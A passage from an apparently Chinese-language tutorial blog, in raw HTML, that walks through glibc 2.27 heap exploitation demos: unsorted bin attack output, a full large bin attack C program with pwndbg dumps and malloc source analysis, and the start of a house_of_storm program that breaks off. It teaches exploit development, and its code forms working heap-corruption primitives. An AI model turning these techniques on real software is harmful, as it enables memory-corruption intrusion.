class="number">0x0</span></span><br><span class="line"><span class="number">0x40</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x50</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x60</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x70</span>: <span class="number">0x0</span></span><br><span class="line"><span class="number">0x80</span>: <span class="number">0x0</span></span><br><span class="line">unsortedbin</span><br><span class="line">all [corrupted]</span><br><span class="line">FD: <span class="number">0x55555555b250</span> —▸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x55555555b250</span></span><br><span class="line">BK: <span class="number">0x7fffffffdc70</span> —▸ <span class="number">0x55555555b260</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></tbody></table></figure>

<p>运行结果</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">This technique only works with buffers not going into tcache, either because the tcache-option <span class="keyword">for</span> glibc was disabled, or because the buffers are bigger than <span class="number">0x408</span> bytes. See build_glibc.sh <span class="keyword">for</span> build instructions.</span><br><span class="line">This file demonstrates unsorted bin attack by write a large <span class="type">unsigned</span> <span class="type">long</span> value into <span class="built_in">stack</span></span><br><span class="line">In practice, unsorted bin attack is generally prepared <span class="keyword">for</span> further attacks, such as rewriting the global variable global_max_fast in libc <span class="keyword">for</span> further fastbin attack</span><br><span class="line"></span><br><span class="line">Let<span class="number">'</span>s first look at the target we want to rewrite on <span class="built_in">stack</span>:</span><br><span class="line"><span class="number">0x7fffffffdd20</span>: <span class="number">0</span></span><br><span class="line"></span><br><span class="line">Now, we allocate first normal chunk on the heap at: <span class="number">0x55555555b260</span></span><br><span class="line">And allocate another normal chunk in order to avoid consolidating the top chunk withthe first one during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">We <span class="built_in">free</span> the first chunk now and it will be inserted in the unsorted bin with its bk pointer point to 0x7ffff7dcfca0</span><br><span class="line">Now emulating a vulnerability that can overwrite the victim-&gt;bk pointer</span><br><span class="line">And we write it with the target address-16 <span class="params">(in <span class="number">32</span>-bits machine, it should be target address<span class="number">-8</span>)</span>:0x7fffffffdd10</span><br><span class="line"></span><br><span class="line">Let's <span class="built_in">malloc</span> again to get the chunk we just <span class="built_in">free</span>. During this time, the target should have already been rewritten:</span><br><span class="line">0x7fffffffdd20: 0x7ffff7dcfca0</span><br></pre></td></tr></tbody></table></figure>

<h3 id="large-bin-attack"><a href="#large-bin-attack" class="headerlink" title="large_bin_attack"></a>large_bin_attack</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">{</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"This file demonstrates large bin attack by writing a large unsigned long value into stack\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"In practice, large bin attack is generally prepared for further attacks, such as rewriting the "</span></span><br><span class="line">           <span class="string">"global variable global_max_fast in libc for further fastbin attack\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var1 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> stack_var2 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Let's first look at the targets we want to rewrite on stack:\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack_var1 (%p): %ld\n"</span>, &amp;stack_var1, stack_var1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack_var2 (%p): %ld\n\n"</span>, &amp;stack_var2, stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p1 = <span class="built_in">malloc</span>(<span class="number">0x420</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now, we allocate the first large chunk on the heap at: %p\n"</span>, p1 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"</span></span><br><span class="line">           <span class="string">" the first large chunk during the free()\n\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p2 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Then, we allocate the second large chunk on the heap at: %p\n"</span>, p2 - <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"And allocate another fastbin chunk in order to avoid consolidating the next large chunk with"</span></span><br><span class="line">           <span class="string">" the second large chunk during the free()\n\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> *p3 = <span class="built_in">malloc</span>(<span class="number">0x500</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Finally, we allocate the third large chunk on the heap at: %p\n"</span>, p3 - <span class="number">2</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"And allocate another fastbin chunk in order to avoid consolidating the top chunk with"</span></span><br><span class="line">           <span class="string">" the third large chunk during the free()\n\n"</span>);</span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">free</span>(p1);</span><br><span class="line">    <span class="built_in">free</span>(p2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"We free the first and second large chunks now and they will be inserted in the unsorted bin:"</span></span><br><span class="line">           <span class="string">" [ %p &lt;--&gt; %p ]\n\n"</span>, (<span class="type">void</span> *)(p2 - <span class="number">2</span>), (<span class="type">void</span> *)(p2[<span class="number">0</span>]));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the"</span></span><br><span class="line">            <span class="string">" freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation"</span></span><br><span class="line">            <span class="string">", and reinsert the remaining of the freed first large chunk into the unsorted bin:"</span></span><br><span class="line">            <span class="string">" [ %p ]\n\n"</span>, (<span class="type">void</span> *)((<span class="type">char</span> *)p1 + <span class="number">0x90</span>));</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(p3);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now, we free the third large chunk and it will be inserted in the unsorted bin:"</span></span><br><span class="line">           <span class="string">" [ %p &lt;--&gt; %p ]\n\n"</span>, (<span class="type">void</span> *)(p3 - <span class="number">2</span>), (<span class="type">void</span> *)(p3[<span class="number">0</span>]));</span><br><span class="line"> </span><br><span class="line">    <span class="comment">//------------VULNERABILITY-----------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Now emulating a vulnerability that can overwrite the freed second large chunk's \"size\""</span></span><br><span class="line">            <span class="string">" as well as its \"bk\" and \"bk_nextsize\" pointers\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk"</span></span><br><span class="line">            <span class="string">" at the head of the large bin freelist. To overwrite the stack variables, we set \"bk\" to 16 bytes before stack_var1 and"</span></span><br><span class="line">            <span class="string">" \"bk_nextsize\" to 32 bytes before stack_var2\n\n"</span>);</span><br><span class="line"></span><br><span class="line">    p2[<span class="number">-1</span>] = <span class="number">0x3f1</span>;</span><br><span class="line">    p2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">    p2[<span class="number">1</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var1 - <span class="number">2</span>);</span><br><span class="line">    p2[<span class="number">3</span>] = (<span class="type">unsigned</span> <span class="type">long</span>)(&amp;stack_var2 - <span class="number">4</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//------------------------------------</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">malloc</span>(<span class="number">0x90</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Let's malloc again, so the freed third large chunk being inserted into the large bin freelist."</span></span><br><span class="line">            <span class="string">" During this time, targets should have already been rewritten:\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack_var1 (%p): %p\n"</span>, &amp;stack_var1, (<span class="type">void</span> *)stack_var1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack_var2 (%p): %p\n"</span>, &amp;stack_var2, (<span class="type">void</span> *)stack_var2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// sanity check</span></span><br><span class="line">    assert(stack_var1 != <span class="number">0</span>);</span><br><span class="line">    assert(stack_var2 != <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>

<p>2.27下的large bin利用手法，首先在栈上申请两个变量 ，这两个变量用于最后的效果演示。然后malloc(0x420) p1，malloc(0x500) p2，malloc(0x500) p3。中间都放一个0x20大小的chunk为了防止合并。释放p1和p2，结构是p2-&gt;p1-&gt;main_arena+96</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsortedbin</span><br><span class="line">all: <span class="number">0x55555555b6b0</span> —▸ <span class="number">0x55555555b250</span> —▸ <span class="number">0x7ffff7dcfca0</span> (main_arena+<span class="number">96</span>) ◂— <span class="number">0x55555555b6b0</span></span><br></pre></td></tr></tbody></table></figure>

<p>由于p1属于small bin范围，而p2属于large bin范围，所以在下面的malloc(0x90)操作，会将p1的一部分还在unsortedbin中而p2会进入large bin中。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b000</span></span><br><span class="line">Size: <span class="number">0x251</span></span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: <span class="number">0x55555555b250</span></span><br><span class="line">Size: <span class="number">0xa1</span></span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(unsortedbin)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x55555555b2f0</span><br><span class="line">Size: 0x391</span><br><span class="line">fd: 0x7ffff7dcfca0</span><br><span class="line">bk: 0x7ffff7dcfca0</span><br><span class="line"></span><br><span class="line">Allocated chunk</span><br><span class="line">Addr: 0x55555555b680</span><br><span class="line">Size: 0x30</span><br><span class="line"></span><br><span class="line">Free <span class="title function_">chunk</span> <span class="params">(largebins)</span> | PREV_INUSE</span><br><span class="line">Addr: 0x55555555b6b0</span><br><span class="line">Size: 0x511</span><br><span class="line">fd: 0x7ffff7dd00d0</span><br><span class="line">bk: 0x7ffff7dd00d0</span><br><span class="line">fd_nextsize: 0x55555555b6b0</span><br><span class="line">bk_nextsize: 0x55555555b6b0</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55555555b2f0 —▸ 0<span class="title function_">x7ffff7dcfca0</span> <span class="params">(main_arena+<span class="number">96</span>)</span> ◂— 0x55555555b2f0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">0x500: 0x55555555b6b0 —▸ 0<span class="title function_">x7ffff7dd00d0</span> <span class="params">(main_arena+<span class="number">1168</span>)</span> ◂— 0x55555555b6b0 </span><br></pre></td></tr></tbody></table></figure>

<p>接下来再将p3放入unsortedbin中，将largebin中的p2的size改成0x3f1，bk改成stack_var1 - 0x10，bk_nextsize改成stack_var2 - 0x20。</p>
<p>此时<code>P2 --&gt; bk --&gt; fd</code>就是stack_var1_addr<code>P2 --&gt; bk_nextsize --&gt; fd_nextsize</code>就是stack_var2_addr。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">20</span>gx <span class="number">0x55555555b6b0</span></span><br><span class="line"><span class="number">0x55555555b6b0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000003f1</span></span><br><span class="line"><span class="number">0x55555555b6c0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007fffffffdc70</span></span><br><span class="line"><span class="number">0x55555555b6d0</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00007fffffffdc58</span></span><br></pre></td></tr></tbody></table></figure>

<p>执行了malloc(0x90)之后p3会被挂进large bin中。在p3挂进large bin中时会判断一下p2和p3的size，看一下下面的源码。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; chunksize_nomask (fwd))</span><br><span class="line">                       {</span><br><span class="line">                         fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">		  assert (chunk_main_arena (fwd));</span><br><span class="line">                       }</span><br><span class="line"></span><br><span class="line">                     <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size</span><br><span class="line">		  == (<span class="type">unsigned</span> <span class="type">long</span>) chunksize_nomask (fwd))</span><br><span class="line">                       <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                       fwd = fwd-&gt;fd;</span><br><span class="line">                     <span class="keyword">else</span></span><br><span class="line">                       {</span><br><span class="line">                         victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                         fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                       }</span><br><span class="line">					bck = fwd-&gt;bk;</span><br></pre></td></tr></tbody></table></figure>

<p>如果p3_size &lt; p2_size则执行对应的东西，若p3_size = p2_size则执行相应的东西，若p3_size &gt; p2_size则执行相应的代码，而这里p3_size很明显大于p2_size，所以我们执行一些赋值操作。这正是我们想要的操作，什么操作呢？将p3插入large bin中并且设置p2和p3的fd_nextsize和bk_nextsize的操作。源码中的victim可以看成p3，fwd可以看成p2。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">p3-&gt;fd_nextsize = p2</span><br><span class="line">p3-&gt;bk_nextsize = p2-&gt;bk_nextsize</span><br><span class="line">p2-&gt;bk_nextsize = p3</span><br><span class="line">p3-&gt;bk_nextsize-&gt;fd_nextsize = p3</span><br><span class="line">bck = p2-&gt;bk</span><br><span class="line">这样子算的话，我们可以发现stack_var2 = p3</span><br></pre></td></tr></tbody></table></figure>

<p>上面是对nextsize的设置接下来源码会对bk、fd进行设置。</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">          mark_bin (av, victim_index);</span><br><span class="line">          victim-&gt;bk = bck;</span><br><span class="line">          victim-&gt;fd = fwd;</span><br><span class="line">          fwd-&gt;bk = victim;</span><br><span class="line">          bck-&gt;fd = victim;</span><br><span class="line">p3-&gt;bk = p2-&gt;bk</span><br><span class="line">p3-&gt;fd = p2</span><br><span class="line">p2-&gt;bk = p3</span><br><span class="line">p2-&gt;bk-&gt;fd = p3</span><br><span class="line">由上面的条件我们可以得出stack_var1 = p3</span><br></pre></td></tr></tbody></table></figure>

<p>所以最后的stack_var1和stack_var2都为p3</p>
<p>运行结果</p>
<figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">This file demonstrates large bin attack by writing a large <span class="type">unsigned</span> <span class="type">long</span> value into <span class="built_in">stack</span></span><br><span class="line">In practice, large bin attack is generally prepared <span class="keyword">for</span> further attacks, such as rewriting the global variable global_max_fast in libc <span class="keyword">for</span> further fastbin attack</span><br><span class="line"></span><br><span class="line">Let<span class="number">'</span>s first look at the targets we want to rewrite on <span class="built_in">stack</span>:</span><br><span class="line">stack_var1 (<span class="number">0x7fffffffdd10</span>): <span class="number">0</span></span><br><span class="line">stack_var2 (<span class="number">0x7fffffffdd08</span>): <span class="number">0</span></span><br><span class="line"></span><br><span class="line">Now, we allocate the first large chunk on the heap at: <span class="number">0x55555555b250</span></span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the first large chunk during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">Then, we allocate the second large chunk on the heap at: 0x55555555b6b0</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the next large chunk with the second large chunk during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">Finally, we allocate the third large chunk on the heap at: 0x55555555bbf0</span><br><span class="line">And allocate another fastbin chunk in order to avoid consolidating the top chunk with the third large chunk during the <span class="title function_">free</span><span class="params">()</span></span><br><span class="line"></span><br><span class="line">We <span class="built_in">free</span> the first and second large chunks now and they will be inserted in the unsorted bin: [ 0x55555555b6b0 &lt;--&gt; 0x55555555b250 ]</span><br><span class="line"></span><br><span class="line">Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the freed second large chunk into the large bin freelist, use parts of the freed first large chunk <span class="keyword">for</span> allocation, and reinsert the remaining of the freed first large chunk into the unsorted bin: [ 0x55555555b2f0 ]</span><br><span class="line"></span><br><span class="line">Now, we <span class="built_in">free</span> the third large chunk and it will be inserted in the unsorted bin: [ 0x55555555bbf0 &lt;--&gt; 0x55555555b2f0 ]</span><br><span class="line"></span><br><span class="line">Now emulating a vulnerability that can overwrite the freed second large chunk's "size" as well as its "bk" and "bk_nextsize" pointers</span><br><span class="line">Basically, we decrease the size of the freed second large chunk to force <span class="built_in">malloc</span> to insert the freed third large chunk at the head of the large bin freelist. To overwrite the <span class="built_in">stack</span> variables, we <span class="built_in">set</span> "bk" to 16 bytes before stack_var1 and "bk_nextsize" to 32 bytes before stack_var2</span><br><span class="line"></span><br><span class="line">Let's <span class="built_in">malloc</span> again, so the freed third large chunk being inserted into the large bin freelist. During this time, targets should have already been rewritten:</span><br><span class="line"><span class="title function_">stack_var1</span> <span class="params">(<span class="number">0x7fffffffdd10</span>)</span>: 0x55555555bbf0</span><br><span class="line"><span class="title function_">stack_var2</span> <span class="params">(<span class="number">0x7fffffffdd08</span>)</span>: 0x55555555bbf0</span><br></pre></td></tr></tbody></table></figure>

<h3 id="house-of-storm-largebin-unsortedbin"><a href="#house-of-storm-largebin-unsortedbin" class="headerlink" title="house_of_storm(largebin + unsortedbin)"></a>house_of_storm(largebin + unsortedbin)</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> filler[<span class="number">0x60</span>];</span><br><span class="line"><span class="type">char</span> target[<span class="number">0x60</span>]; </span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span 